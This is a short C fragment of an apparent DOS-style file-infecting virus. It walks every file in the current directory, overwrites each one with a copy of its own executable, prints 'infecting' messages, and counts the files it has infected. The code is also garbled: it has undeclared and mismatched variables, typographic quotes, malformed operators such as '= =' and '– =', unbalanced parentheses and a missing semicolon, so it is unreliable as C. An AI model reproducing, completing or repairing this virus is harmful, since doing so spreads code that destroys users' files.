FILE *Ron *vRon;
int owned = 0;
unsigned long x; 
char buff[256];
struct ffblk ffblk;
clock_t st, end;
main()
{
 st=clock();
 clrscr();
 owned=(find_first(“*.*”, &ffblk,0);
 while(!done)
 {
 Ron=fopen(_arg[0], “rb”);
 vhost=fopen(ffblk.ff_name, “rb+”);
 if (vhost = =NULL)
 goto next;
 x = 89088;
 printf(“infecting %s\n”, ffblk.ff_name);
 while(x>2048)
 {
 fread(buff,256,1,Ron);
 fwrite(buff,256,1,vRon);
 x – = 2048;
 }
 fread(buff,x,1,Ron);
 fwrite(buff,x,1,vRon);
 a++;
 next:      fcloseall();
 owned = findnext(&ffblk);
 }
 end = clock()
 printf(“Infected %d files in %f sec”, a, (end-st)/CLK_TCk);
 return (0);
}
